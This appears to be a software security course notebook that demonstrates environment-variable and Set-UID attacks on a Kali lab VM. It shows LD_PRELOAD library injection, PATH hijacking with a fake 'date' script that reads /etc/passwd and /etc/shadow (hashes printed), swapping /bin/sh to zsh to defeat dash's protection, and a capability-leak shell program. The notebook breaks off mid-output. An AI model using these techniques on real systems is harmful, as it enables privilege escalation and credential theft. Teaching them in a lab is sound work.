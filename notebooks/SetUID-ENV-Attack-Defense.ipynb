{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "995bab00-bff8-4ba8-bcd3-a94207726d31",
   "metadata": {},
   "source": [
    "# Environment Variables and SetUID Programs: Attacks and Mitigations\n",
    "\n",
    "## Environment Variables Pitfalls\n",
    "- there's no known inherent vulnerability on environment variables\n",
    "- like many features of OSes, they just provide a convenient way to manage configuration settings\n",
    "\n",
    "### Security Risks\n",
    "- env vars are accessible by processes on the system; means that sensitive information stored in them such as API keys or database credentials could potentially be exposed if proper security measures not in place\n",
    "\n",
    "### Accidental Overwriting\n",
    "- since env vars are dynamic and can be changed at runtime, there's a risk of accidental overwriting\n",
    "- a misconfigured or malicious process might alter the values of critical variables, leading to unexpected behavior of applications\n",
    "\n",
    "### Debugging Challenges\n",
    "- in complex systems, tracing the source of a problem can be difficult\n",
    "\n",
    "### Dependency on External Configuration\n",
    "- overreliance on environment variables for configuration settings can make it challenging to manage and version configurations, esp. in larger projects\n",
    "- changes in configruations may require updates in multiple places, leading to potentital inconsistencies\n",
    "\n",
    "### Lack of Encryption\n",
    "- environment variables are typically stored in plaintext\n",
    "- sensitive information if stored as env vars can be exposed\n",
    "\n",
    "### Limited Access Control\n",
    "- access control on env variables are ususally limited\n",
    "- it can be challenging to ensure proper access control to preven unauthorized access and modification to sensitive variables\n",
    "\n",
    "### Hard-Coding Pitfall\n",
    "- care should be taken to access the hard-coded env vars in programs\n",
    "- what if the values of the variables are modified by the malicios programs and processes?\n",
    "\n",
    "## Vulnerabilities due to Environment Variables\n",
    "\n",
    "### Linker/Loader\n",
    "\n",
    "- Linker is a special program used to find the external library functions used by a program\n",
    "- usually out of developers controls\n",
    "- Linker in most OSes use env variables to find where the libraries are\n",
    "- provides opporunity for malicious users to link \"malicious\" libraries and code\n",
    "\n",
    "\n",
    "### Library\n",
    "\n",
    "- most programs invoke api functions from external libraries\n",
    "- the external libraries may not have been developed for privileged programs\n",
    "    - may not santize the values of the environment variables\n",
    "    \n",
    "### External program\n",
    "\n",
    "- a program may invoke external program(s) for certain functionalities\n",
    "    - sending emails, printing, reading network data, etc.\n",
    "- when the program is invoked, its code may run with the calling process's privilege\n",
    "- the external program may in turn use env variables expanding the attack surface and increasing the risks\n",
    "\n",
    "### Application code\n",
    "\n",
    "- a program may implicitly use environment variables in its code\n",
    "- developers may have misunderstanding and wrong assumptions of how environment variables get passed into the program\n",
    "- these assumptions may lead into using unsanitized env variables leading to vulnerable code"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b7455bb4-dffa-402d-8611-5ad14ba0ec7b",
   "metadata": {},
   "source": [
    "### Attacks via Dynamic Linker\n",
    "\n",
    "- before the program executes, **linker** program links the code with the system's libraries\n",
    "- linking can be done in two places: statically and dynamically\n",
    "- let's look into each type of linking\n",
    "\n",
    "#### Static Linking\n",
    "- links the program code and librariy code into a single binary without relying on the external library code\n",
    "- the executable is self-contained\n",
    "    - it has everything it needs in the same program file\n",
    "    \n",
    "- we can specify `-static` option in **gcc** and **g++** compilers for static linking\n",
    "- program file becomes huge (many magnitudes bigger compared to dynamic linking)\n",
    "- takes more memory to load the whole program into RAM\n",
    "- if the library has bug/security holes, your application program will be shipped with the bugs and holes\n",
    "\n",
    "#### Dynamic Linking\n",
    "\n",
    "- link the external libraries during program execution\n",
    "- by default compilers perform dynamic linking\n",
    "- program files are much smaller\n",
    "- many program share the same **shared** library loaded by OS\n",
    "    - in `*nix` systems, these files are `.so` extension (Shared Object)\n",
    "    - in Windows, these files are called DLLs (Dynamic link libraries)\n",
    "- we can use `ldd` command to see what shared libraries a program depends on\n",
    "- in `*nix` systems, ELF (Executable and Linkable File) contains `.interp` section that specifies the name of the linker\n",
    "    - the linker itself is a shared library (`ld-linux.so`, `ld.so`)\n",
    "- let's see a `hello.cpp` program to demonstrate the differences"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b36a8e89-98ee-4c7c-a920-37de5cb20486",
   "metadata": {},
   "outputs": [],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "202232d1-2a5e-4fdc-af3f-6cdee3934827",
   "metadata": {},
   "outputs": [],
   "source": [
    "# change cwd if needed\n",
    "%cd ../demos/envvars"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1dbeeb17-86ad-4c2a-8cf4-f4d061f01e3d",
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat hello.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "86fc495e-5936-4fc4-b2ed-3fab82157cb6",
   "metadata": {},
   "outputs": [],
   "source": [
    "# compile with static linking\n",
    "! g++ -static -o hello_static.exe hello.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71ec85c2-d1c4-4cf5-aa57-d072ab50cb3b",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Note the size of the binary\n",
    "! ls -al hello_static.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "38f7ca08-1866-4bfc-bffa-7bf954adbeef",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./hello_static.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f2c2bd54-ff0a-4c79-9641-35bfc4b1ceb0",
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's see what ldd program says\n",
    "! ldd hello_static.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "784537f6-5431-48d6-ac16-521c430b2f04",
   "metadata": {},
   "outputs": [],
   "source": [
    "# compile for dynamic linking\n",
    "! g++ -o hello_dynamic.exe hello.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "82787ce8-c825-4d88-8e8c-77ac200c4292",
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's see the size\n",
    "! ls -al hello_dynamic.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9489f58e-e78c-4800-b78b-5d6e1abe8f72",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./hello_dynamic.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe2f4e12-d785-4f3d-8b6c-cd7b812b9827",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ldd hello_dynamic.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "59cf1e79-912e-4048-891b-2b9361a5b19c",
   "metadata": {},
   "source": [
    "## Dynamic Linking Exploitation\n",
    "\n",
    "- missing code is decided during run-time\n",
    "- missing libraries are search in default path provided by ENV variables such as **LD_PRELOAD**, **LD_LIBRARY_PATH**\n",
    "- these variable are not set by default\n",
    "- however, they can be set and exported so the programs can use them\n",
    "- since we can't set ENV variables from Jupyter Notebooks, we'll use a Terminal\n",
    "- the demo programs used are: `demos/envvars/dynamic_vuln.cpp` and `demos/envvars/mysleep.c`\n",
    "- dynamic library must be written in C not in C++"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a908661-7a5b-4d0c-b1b8-244f6f112745",
   "metadata": {},
   "outputs": [],
   "source": [
    "! printenv PATH"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "3733ad1b-c0e5-45d2-8866-4f4d1ff55bd6",
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's see LD_PRELOAD varialbe\n",
    "! printenv LD_PRELOAD"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "b75703e0-abf4-45f1-adba-bfb1eeed7501",
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's see LD_LIBRARY_PATH\n",
    "! printenv LD_LIBRARY_PATH"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "01dafc12-55e7-46eb-ac35-721abc50f408",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f009bac-fca1-4bcf-8c32-97f251a9dbbc",
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat dynamic_vuln.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "453ec676-83ce-498a-ab06-e00e2fc54300",
   "metadata": {},
   "outputs": [],
   "source": [
    "! g++ -o dynamic_vuln.exe dynamic_vuln.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2413d9a5-0ad7-4e36-a6a9-807a3c9bb063",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./dynamic_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f86d1515-52d1-47a4-9e90-b4a4e954649a",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ldd dynamic_vuln.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f21db03a-31ba-4317-acba-a4623104a847",
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat mysleep.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "8c108537-1ee8-4e95-a074-5d1bcbbf8959",
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's just compile into object code and not build it as an executable\n",
    "# creates sleep.o file\n",
    "! gcc -c mysleep.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f14873a4-f96f-4c78-9a23-0bec356167d3",
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's check the file\n",
    "! ls -al mysleep.o"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "9a9fe780-8798-4854-930d-3c1da5ed0ef6",
   "metadata": {},
   "outputs": [],
   "source": [
    "# create a shared library from mysleep.o object file\n",
    "! gcc -shared -o mysleeplib.1.0.0.so mysleep.o"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0bd2512-1135-4619-b0ba-24ac09578a61",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al mysleeplib.1.0.0.so"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "c1701796-38df-476b-8fdf-7b78327e1f88",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]\n",
    "└─$ export LD_LIBRARY_PATH=$PWD            \n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]\n",
    "└─$ export LD_PRELOAD=./mysleeplib.1.0.0.so\n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]\n",
    "└─$ ./dynamic_vuln\n",
    "I'm sleeping for 2 seconds.\n",
    "Sorry I'm not sleeping...\n",
    "I'm awake now...                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]\n",
    "└─$ ldd dynamic_vuln\n",
    "        linux-vdso.so.1 (0x00007ffff9bf7000)\n",
    "        ./mysleeplib.1.0.0.so (0x00007fa30c0d9000)\n",
    "        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fa30bedd000)\n",
    "        /lib64/ld-linux-x86-64.so.2 (0x00007fa30c0e5000)\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b4d5450f-4729-4975-ab9e-5638760baa39",
   "metadata": {},
   "source": [
    "### Set-UID Programs - Exercise\n",
    "\n",
    "- verify that the above attack will NOT work for Set-UID programs\n",
    "- do research on why it won't work\n",
    "\n",
    "## PATH Environment Variable Vulnerabilty\n",
    "\n",
    "- if your program uses system calls to an external program that relies on PATH variable to lookup its path, it is vulnerable!\n",
    "- `today.cpp` program in `demos/envexploit` folder uses `system` API to rely on PATH variable to call date function\n",
    "- can we force this program to read `/etc/passwd` file without modifying the program itself?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "487c8485-581f-4b17-8ea4-aff1feda5066",
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b1fad6ff-b614-4e26-b601-aee148dfc7d2",
   "metadata": {},
   "outputs": [],
   "source": [
    "# change cwd if needed\n",
    "%cd ../envexploit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ad7b796d-cb35-4d43-8b2b-decb66cdab63",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3b8d63fa-4c61-4d3f-a6ae-75b709fba7fe",
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat today.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7f2c771e-8252-4cd9-a8fc-379370e8c84c",
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat  Makefile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "139a881e-ef2c-40f0-80c6-44cd1f24c37e",
   "metadata": {},
   "outputs": [],
   "source": [
    "! make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "91f679fa-99ed-4c36-a421-f12f34ad798d",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "64be312c-f41a-4908-adb0-d2a3c3990e7c",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./today"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15de8c03-9281-4b8f-9c06-e8df99c0e749",
   "metadata": {},
   "outputs": [],
   "source": [
    "! which date"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2811542c-ec28-487b-aaaa-7214cb2ef59a",
   "metadata": {},
   "source": [
    "## Exploitation of PATH env variable\n",
    "\n",
    "- today program uses `system` API to call `date` program\n",
    "- system finds `date` program by search the `PATH` env variable which is in `/usr/bin/date`\n",
    "- create your own \"date\" program; that does whatever you want it to do\n",
    "- update the PATH so it finds your \"date\" program before finding system's `/usr/bin/date`\n",
    "- you can write your program in whatever language of your choice\n",
    "    - bash script is the easiest in this case\n",
    "- see `date` script in the `demo/envexploit` folder\n",
    "- make the program executable\n",
    "- update the PATH from Terminal and run the today program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "544849be-d563-4498-ad8d-10458dab5cee",
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "45c20787-aa9a-4226-9f3c-b2471438775b",
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat date"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "id": "ce7d4032-42c8-4058-b257-c8df653ed90c",
   "metadata": {},
   "outputs": [],
   "source": [
    "! chmod +x date"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17bd8bab-2194-4bd9-bdc3-5b2190e5fe59",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al date"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ba1d180d-4506-4281-9503-44de1726c777",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./date"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "bf02eb7b-33f5-4b30-ba6e-6fe36a5864b0",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ export PATH=$PWD:$PATH \n",
    "                                                                                                     \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ echo $PATH            \n",
    "/home/kali/projects/SoftwareSecurity/demos/envexploit:/home/kali:/home/kali/miniconda3/bin:/home/kali/miniconda3/condabin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/games:/usr/games:/home/kali//home/kali/bin\n",
    "\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ ./today\n",
    "Today is: root:x:0:0:root:/root:/usr/bin/zsh\n",
    "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
    "...\n",
    "\n",
    "kali:x:1000:1000:kali,,,:/home/kali:/usr/bin/zsh\n",
    "bob:x:1001:1001:,,,:/home/bob:/bin/bash\n",
    "Woohoo I got it!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2097d744-72bd-4e22-bda6-230d949be9e2",
   "metadata": {},
   "source": [
    "## Direct Usage of Env Vars in Application Code\n",
    "\n",
    "- if ENV variables are accessed and used as part of the application code, it may be vulnerable\n",
    "- let's see `demos/envvars/print_pwd.cpp` do demo the vulnerability and its exploitation\n",
    "- the program prints current working directory, similar to `pwd` program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0b9ceb41-752e-400d-8e38-b28bda278f69",
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0f176014-e67c-4d2a-970a-ccd8c4a83dab",
   "metadata": {},
   "outputs": [],
   "source": [
    "# change cwd if needed\n",
    "%cd ../demos/envvars"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "058a0df8-732e-40a3-9d11-078e241ec6ce",
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat print_pwd.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "b1503db0-4254-47c9-81f1-15da5d29ce36",
   "metadata": {},
   "outputs": [],
   "source": [
    "! g++ -o print_pwd.exe print_pwd.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8fd8140d-1fe6-4a68-835c-a6d697717a04",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./print_pwd.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0a0134c7-d038-4ed7-a253-34693bdac576",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]\n",
    "└─$ pwd\n",
    "/home/kali/projects/SoftwareSecurity/demos/envvars\n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]\n",
    "└─$ echo $PWD                              \n",
    "/home/kali/projects/SoftwareSecurity/demos/envvars\n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envvars]\n",
    "└─$ cd ..                                  \n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]\n",
    "└─$ echo $PWD     \n",
    "/home/kali/projects/SoftwareSecurity/demos\n",
    "\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]\n",
    "└─$ ./envvars/print_pwd\n",
    "Current working directory is: /home/kali/projects/SoftwareSecurity/demos\n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]\n",
    "└─$ PWD=abc               \n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]\n",
    "└─$ ./envvars/print_pwd\n",
    "Current working directory is: abc\n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]\n",
    "└─$ export PWD=\"Whatever you wish...\"      \n",
    "                                                                                                                \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos]\n",
    "└─$ ./envvars/print_pwd\n",
    "Current working directory is: Whatever you wish...\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0d614b6-0e2d-457f-9b98-14a4c1903506",
   "metadata": {},
   "source": [
    "## Exploitation of Set-UID Programs\n",
    "\n",
    "- the impact of the exploitation of set-uid programs can be severe\n",
    "- can compromise all 3 CIA triads\n",
    "    - what are CIA triads?\n",
    "\n",
    "![Set-UID Exploitation](./media/setuid-attacks.png)\n",
    "\n",
    "### Exploitation Via User Inputs\n",
    "\n",
    "#### Buffer Overflow Vulnerability\n",
    "- covered in depth later in Bufffer Overflow chapters\n",
    "- overflow a buffer to run arbitrary malicious code\n",
    "\n",
    "#### Format String Vulnerability\n",
    "- covered in depth later in Format String chapter\n",
    "- change program behavior using user inputs for format strings\n",
    "\n",
    "### Exploitation via System Inputs\n",
    "- covered in Race Condition chapter\n",
    "\n",
    "### Exploitation via Environment Variables\n",
    "- if the program (e.g., today program) is set-uid, you can exploit it to execute any program as the owner of the program\n",
    "- if the program is root, anyone who can run this program gains root's privileges during its execution\n",
    "    - esentially, it typically escalates users' privileges and that can have serious consequences\n",
    "- `system(command)` is a wrapper for `/bin/sh`\n",
    "    - it is invoked as `/bin/sh -c command`\n",
    "    - i.e., it invokes `/bin/sh` and and asks the shell to execute the command\n",
    "- `system()` passes the env vars of calling process to the new program `/bin/sh`\n",
    "- in newer version of Linux (Ubuntu 20.04 and Kali 2023, e.g.), `/bin/sh` is actually a symbolic link pointing to `/bin/dash`\n",
    "- `/bin/dash` has a conutermeasure that prevents itself from being executed in a Set-UID process\n",
    "    - if dash detects that it is being executed in a Set-UID prorcess, it immediately changes the effective User ID to the process's real ID -- essentially dropping the privilege\n",
    "- if we update the `date` script and try to read priviledged `/etc/shadow` file, it'll fail!\n",
    "- we can however update the softlink  `/bin/sh` to point to `/bin/zsh` which doesn't have the countermeasure\n",
    "- let's use `demos/envexploit/today.cpp` file to demostrate the vulnerability and exploitation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0cbe127a-470b-4fc8-8d0f-f8dd1c87aece",
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a13d1c2a-b7df-426f-96fd-5ac4a9ee8744",
   "metadata": {},
   "outputs": [],
   "source": [
    "%cd ../envexploit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9fabf506-5c8d-4c10-8a9b-ad966e0940f3",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al /bin/sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a06350da-9dc6-4a3d-8133-838b8f25135a",
   "metadata": {},
   "outputs": [],
   "source": [
    "# if needed, do the following \n",
    "# let's create a soft link /bin/sh pointing to /bin/dash\n",
    "# this is the default\n",
    "! echo kali | sudo -S ln -sf /bin/dash /bin/sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "25ce446e-e0b0-4f2c-967c-bf1cd231edd5",
   "metadata": {},
   "outputs": [],
   "source": [
    "! g++ -o today today.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3295ac9-6ea5-476f-bb13-142bfe39b0dc",
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | sudo -S chown root today"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a4fca951-29d2-456c-904f-c6de41f7c080",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aa17b7db-638a-4cc9-97b8-1822173caca6",
   "metadata": {},
   "outputs": [],
   "source": [
    "! echo kali | sudo -S chmod +s today"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b0057334-b3c1-4eb7-84de-d8191c5d67da",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "16561ec7-e334-482a-a9a8-691730a0fe99",
   "metadata": {},
   "outputs": [],
   "source": [
    "! cat date "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "188023ef-6191-4660-a19f-856b4ab9c311",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ ./today\n",
    "Today is: cat: /etc/shadow: Permission denied\n",
    "Command failed :(\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "da7232ac-a10b-456e-bef9-7bdafee44ee8",
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's create a soft link /bin/sh pointing to /bin/zsh\n",
    "! echo kali | sudo -S ln -sf /bin/zsh /bin/sh"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7947b920-6483-4292-9705-966a4df3373f",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al /bin/sh"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "52896938-0a94-426d-b398-f326d91aa8fe",
   "metadata": {},
   "source": [
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/envexploit]\n",
    "└─$ ./today\n",
    "Today is: root:!:19662:0:99999:7:::\n",
    "...\n",
    "kali:$y$j9T$K/agt9PK0eYweoRVbd9yK0$6BUblkWhNb00ZJWw7nYm0fZL1bpF.1BAs5h0CRF4xj2:19662:0:99999:7:::\n",
    "bob:$y$j9T$KoIINXes24L0Z2qTeAdEX0$aNnlXFBUXuSZrsiCKPFPCxMIz/KNoz0gIzFnOppN2F1:19739:0:99999:7:::\n",
    "Woohoo I got it!\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "005255af-0f50-40db-a810-bcadc46f8d9c",
   "metadata": {},
   "source": [
    "## Capability Leaking Vulnerability\n",
    "\n",
    "- in some cases, privileged programs downgrade themselves during execution\n",
    "- E.g., **su** program\n",
    "\n",
    "### su\n",
    "- su is a privileged set-uid program\n",
    "- allows user to switch to another user (say user1 to user2)\n",
    "- program starts with EUID as root and RUID as user1\n",
    "- after password verification, both EUID and RUID becomes user2's (via privilege downgrading)\n",
    "- such programs may lead to capability leaking if not implemented correctly\n",
    "    - programs may not clean up privileged capabilities before downgrading\n",
    "\n",
    "### Exploiting Capability Leak\n",
    "- let's look at an example program provided in `demos/capleak/` folder\n",
    "- program opens a file in `/etc` in **write/append** mode\n",
    "- program must be root setuid to be able to write to the `/etc` folder\n",
    "- program downgrades the privilege with the RUID of the user\n",
    "- it then executes `/bin/sh`\n",
    "- conviniently, file descriptor value is also printed\n",
    "- run the program from the Terminal to get the shell \n",
    "- it's guaranted that the file description will be a lower integer greater than 2\n",
    "    - 0: used for stdin\n",
    "    - 1: used for stdout\n",
    "    - 2: used for stderr"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "081ad135-cd23-4f9d-b20f-56e728d59bf2",
   "metadata": {},
   "outputs": [],
   "source": [
    "! pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eb868cde-b8e4-4059-b43b-88d9edf32285",
   "metadata": {},
   "outputs": [],
   "source": [
    "%cd ../demos/capleak"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f250afc5-5757-406c-bcad-15ef319f13db",
   "metadata": {},
   "outputs": [],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "a071aba4-ca28-4d0e-84ac-b88acc09781e",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "// https://github.com/seed-labs/seed-labs/blob/master/category-software/Environment_Variable_and_SetUID/Labsetup/cap_leak.c\n",
      "#include <unistd.h>\n",
      "#include <stdio.h>\n",
      "#include <stdlib.h>\n",
      "#include <fcntl.h>\n",
      "\n",
      "using namespace std;\n",
      "\n",
      "int main(int argc, char *argv[])\n",
      "{\n",
      "    int fd;\n",
      "    char *v[2];\n",
      "\n",
      "    fd = open(\"/etc/xyz\", O_RDWR | O_APPEND | O_CREAT);\n",
      "    if (fd == -1)\n",
      "    {\n",
      "        printf(\"Failed to open /etc/xyz\\n\");\n",
      "        exit(1);\n",
      "    }\n",
      "    // print out the file descriptor value\n",
      "    printf(\"fd is %d\\n\", fd);\n",
      "    // FIXME - close the file descriptor\n",
      "    // downgrade the privilege mb making the effective uid the same as the real uid\n",
      "    setuid(getuid());\n",
      "    // execute /bin/sh using execve\n",
      "    v[0] = \"/bin/sh\";\n",
      "    v[1] = 0;\n",
      "    execve(v[0], v, 0);\n",
      "    return 0;\n",
      "}\n"
     ]
    }
   ],
   "source": [
    "! cat capleak.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "5cd4a834-d511-4820-800e-c45d71b70442",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "g++ -g -Wall -std=c++17 capleak.cpp -o capleak.exe\n",
      "\u001b[01m\u001b[Kcapleak.cpp:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kint main(int, char**)\u001b[m\u001b[K’:\n",
      "\u001b[01m\u001b[Kcapleak.cpp:26:12:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[KISO C++ forbids converting a string constant to ‘\u001b[01m\u001b[Kchar*\u001b[m\u001b[K’ [\u001b[01;35m\u001b[K-Wwrite-strings\u001b[m\u001b[K]\n",
      "   26 |     v[0] = \u001b[01;35m\u001b[K\"/bin/sh\"\u001b[m\u001b[K;\n",
      "      |            \u001b[01;35m\u001b[K^~~~~~~~~\u001b[m\u001b[K\n",
      "sudo chown root capleak.exe\n",
      "sudo chmod +s capleak.exe\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "b7c2b332-3d6e-4625-b1fa-5f58614da7af",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 48\n",
      "drwxrwxrwx+  2 codespace root  4096 Feb 10 20:15 .\n",
